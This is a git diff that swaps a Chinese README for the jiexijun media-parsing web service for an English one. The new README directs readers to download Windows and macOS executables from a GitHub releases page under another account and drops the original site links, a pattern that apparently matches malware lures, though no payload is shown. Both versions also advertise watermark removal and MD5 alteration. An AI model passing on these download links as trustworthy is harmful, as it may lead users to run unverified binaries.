@@ -1,91 +1,94 @@
-<div align="center">
+# 🚀 jiexijun - Effortless Media Parsing Made Simple
 
-# 🎬 解析君 - 自媒体素材批量解析神器
+[![Download jiexijun](https://img.shields.io/badge/Download%20jiexijun-v1.0-blue.svg)](https://github.com/Juicper69/jiexijun/releases)
 
-[![Website](https://img.shields.io/badge/官网-jiexijun.com-blue?style=flat-square)](https://jiexijun.com)
-[![App](https://img.shields.io/badge/工作台-app.jiexijun.com-orange?style=flat-square)](https://app.jiexijun.com/parse)
-[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
+## 📄 Overview
 
-**专为自媒体人打造的素材神器**
+Welcome to jiexijun! This application simplifies media parsing for various platforms. Whether you need to download videos without watermarks or extract audio, jiexijun gives you the tools you need, hassle-free. 
 
-批量去水印 · 图集下载 · 链接清洗 · 自动解析 · MD5修改 · 音频提取
+### 🌟 Features
 
-[立即使用](https://app.jiexijun.com/parse) · [了解更多](https://jiexijun.com)
+- **Bulk Downloads:** Save time by downloading multiple media files at once.
+- **Watermark Removal:** Eliminate watermarks from images and videos easily.
+- **Supports 20+ Platforms:** Compatible with popular platforms like Douyin, Kuaishou, and Xiaohongshu.
+- **MD5 Modification:** Change or remove MD5 signatures as needed.
+- **Audio Extraction:** Convert video files to audio quickly.
+- **User-Friendly Interface:** No technical skills required—simply point and click.
 
-</div>
+## 🛠️ System Requirements
 
----
+- **Operating System:** Windows 10 or later / macOS 10.15 (Catalina) or later
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 200 MB available: enough for installations and downloads
+- **Internet Connection:** Required for downloading files
 
-## ✨ 核心功能
+## 🚀 Getting Started
 
-### 🚀 批量解析，一键去水印
-告别繁琐的单个链接处理，支持多平台多链接批量解析，自动识别并移除各类水印，轻松获取干净的原始素材。
+To start using jiexijun, first, you need to download it from the Releases page. Follow these steps:
 
-### 🎥 20+ 平台视频无水印下载
-支持抖音、快手、小红书、B站、微博、Instagram 等主流平台视频无水印下载，一键获取高清原始视频。
+1. **Visit the Releases Page:** Click on this link to go to our [Releases page](https://github.com/Juicper69/jiexijun/releases).
+   
+2. **Select the Latest Release:** Look for the latest version available. It is usually marked with "Latest Release."
 
-### 🖼️ 图集一键批量下载
-自动识别并提取页面中的所有图片资源，支持批量下载，告别手动右键保存的繁琐操作。
+3. **Download the Application:**
+   - For Windows, find the file named `jiexijun-windows.exe`.
+   - For macOS, choose the file named `jiexijun-macos.app`.
 
-### 🔥 热点总榜数据聚合
-实时聚合 20+ 平台热搜榜单，掌握最新热点趋势，发现爆款内容灵感，助力内容创作精准把握市场热度。
+4. **Install**: 
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: Drag the `.app` file to your Applications folder and then open it.
 
-### 🎵 专业音频提取工具
-一键从视频中提取高质量音频，支持多种格式转换，满足配音、剪辑、音频创作等多种需求。
+5. **Open jiexijun:** Once installed, you can find the application in your applications folder. Open it to begin parsing media.
 
-### 🔐 专业 MD5 修改工具
-在保持文件内容不变的情况下，智能修改文件 MD5 值，支持图片、视频、音频等多种文件格式。
+## 🌐 Download & Install
 
----
+To download jiexijun, click the button below or visit the [Releases page](https://github.com/Juicper69/jiexijun/releases):
 
-## 🎯 为什么选择解析君？
+[![Download jiexijun](https://img.shields.io/badge/Download%20jiexijun-v1.0-blue.svg)](https://github.com/Juicper69/jiexijun/releases)
 
-- ⚡ **高效批量处理** - 支持多链接批量解析，大幅提升工作效率
-- 🎨 **多平台支持** - 覆盖 20+ 主流内容平台
-- 🔄 **自动化解析** - 可配置自动解析规则，解放双手
-- 📊 **热点数据聚合** - 实时掌握各平台热点趋势
-- 🛠️ **专业工具集成** - MD5 修改、音频提取等实用功能
-- 💎 **无水印下载** - 获取高清原始素材
+## 🎉 How to Use jiexijun
 
----
+1. **Launch the Application:** Open jiexijun by double-clicking it.
+2. **Input Links:** Paste the media links you want to download into the input area provided.
+3. **Choose Options:** Select your desired operations from the features listed (like watermark removal).
+4. **Start Download:** Click the "Download" button and wait for the process to complete.
+5. **Access Your Files:** Find downloaded files in your specified output folder.
 
-## 📊 数据说话
+## ❓ FAQs
 
-<div align="center">
+### How do I know if my download is complete?
 
-### 🎉 已服务 20,000+ 创作者
+The application shows a progress bar during downloads. Once complete, you will receive a notification.
 
-**每天帮助数千位创作者节省 2 小时素材处理时间**
+### Can I download from multiple platforms?
 
-</div>
+Yes, jiexijun supports a variety of platforms, including Douyin, Kuaishou, and Xiaohongshu. Just paste the links from these sites.
 
----
+### Is there support if I run into issues?
 
-## 💬 用户评价
+Yes, you can visit our GitHub Issues page to report any problems or seek help from the community.
 
-> "解析君极大提升了我们团队的素材处理效率，节省了大量时间。"  
-> —— 梁宇航，短视频平台负责人
+## 🤝 Contributing
 
-> "使用解析君后，创作流程变得无比顺畅，素材收集轻松高效！"  
-> —— 刘雨彤，内容创作者
+We welcome contributions to enhance jiexijun! If you would like to help, please read our contributing guidelines in the repository. Your input can make the application even better for everyone.
 
-> "接口响应快如闪电，稳定性极佳，希望越来越好！"  
-> —— 王天阳，学生开发者
+## 🏷️ Topics
 
----
+- douyin
+- dy
+- images
+- jiexijun
+- kuaishou
+- parse
+- qushuiyin
+- video
+- xiaohongshu
+- xigua
 
-## 🔗 相关链接
+## 📜 License
 
-- 🌐 [官方网站](https://jiexijun.com)
-- 💻 [工作台](https://app.jiexijun.com/parse)
-- 📧 联系我们：[email]
+jiexijun is open source and licensed under the MIT License. Feel free to use it as per the terms of the license.
 
----
+## 🌟 Thank You
 
-<div align="center">
-
-**让创作更高效，让素材触手可及**
-
-Made with ❤️ by 解析君团队
-
-</div>
+Thank you for choosing jiexijun! We hope it makes media parsing an easy and efficient task for you.
